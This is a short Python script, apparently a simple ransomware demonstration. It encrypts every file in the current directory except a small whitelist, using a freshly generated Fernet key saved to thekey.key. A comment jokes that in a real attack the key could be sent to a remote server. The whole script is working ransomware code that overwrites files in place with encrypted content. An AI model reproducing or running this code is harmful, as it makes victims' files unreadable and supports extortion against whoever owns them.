#!/usr/bin/env python3

# find files 

from asyncio import constants
import os
from cryptography.fernet import Fernet

files = []

def white_list_files():
    current_filename = __file__.split("/")[-1] 
    white_list = [current_filename, 'readme.md', "thekey.key", "decrypt.py", "requeriments.txt"]
    return white_list 

# Get currently directory and list. 
for file in os.listdir():
    if file in white_list_files():
        continue

    if os.path.isfile(file):
        files.append(file)


# Generate the files decrypt key
key = Fernet.generate_key()

# On real attack this can be send to a remote server, or not HAHAHHAHA. 
with open("thekey.key", "wb") as the_key: 
    the_key.write(key)

# Foreach file it will:
for file in files:

    # Open the file like a binary 
    with open(file, "rb") as the_file:
        contents = the_file.read() 

    # Encrypt the content
    contents_encrypted = Fernet(key).encrypt(contents)

    # Write the content encrypted like a binary. 
    with open(file, "wb") as the_file:
        the_file.write(contents_encrypted) 